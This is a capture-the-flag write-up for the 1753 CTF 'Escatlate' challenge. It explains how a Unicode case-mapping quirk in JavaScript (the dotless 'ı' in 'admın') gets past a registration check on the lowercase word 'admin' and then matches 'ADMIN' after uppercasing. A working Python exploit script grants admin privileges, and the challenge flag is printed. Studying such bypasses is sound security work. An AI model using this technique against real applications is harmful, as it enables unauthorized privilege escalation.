# 1753 CTF - Escatlate Flag #2

## Approach

We need an `ADMIN` role to get the second flag, let's first see how the server checks the `ADMIN role:

During the registration:

```js
app.post('/api/register', (req, res) => {

    // ...

    if(req.body.role?.toLowerCase() == 'admin')
        return res.status(400).send('Invalid role');
```

During the verification:

```js
app.get('/api/message', (req, res) => {
    if(req.user.role.toUpperCase() === 'ADMIN')
        return res.json({ message: `Hi Admin! Your flag is ${process.env.ADMIN_FLAG}` });
```

To bypass the check, we need some JavaScript tricks related to `toUpperCase` and `toLowerCase`. Take a look at the code below:

```js
for (let i = 128; i < 65536; i++) {
  for (let ch of "abcdefghijklmnopqrstuvwxyz") {
    if (String.fromCharCode(i).toUpperCase() === ch.toUpperCase()) {
      console.log(
        i,
        `${String.fromCharCode(i)}.toUpperCase() = ${ch.toUpperCase()}`
      );
    }
    if (String.fromCharCode(i).toLowerCase() === ch) {
      console.log(i, `${String.fromCharCode(i)}.toLowerCase() = ${ch}`);
    }
  }
}
// 305 ı.toUpperCase() = I
// 383 ſ.toUpperCase() = S
// 8490 K.toLowerCase() = k
```

This a cheat sheet of this trick, and for this challenge we can use `ı` for `admın` to bypass the check during registration, and `"admın".toUpperCase()` will be `"ADMIN"`.

```python
import requests
import random

url = "https://escatlate-52bc47e034fa.1753ctf.com/api/"

rnd = str(random.randint(100000, 999999))
print(rnd)

resp = requests.post(url + "register", json={
    "username": rnd,
    "password": rnd,
    "role": "admın"  # <-- 'ı' is not 'i'!
})
print(resp.status_code, resp.text)

token = resp.json()["token"]

resp = requests.get(url + "message", headers={
    "X-Token": token
})
print(resp.text)  # {"message":"Hi Admin! Your flag is 1753c{w3ll_n0w_th4h_w4s_n0t_soooo_obv1ous}"}
```

## Flag

```
1753c{w3ll_n0w_th4h_w4s_n0t_soooo_obv1ous}
```
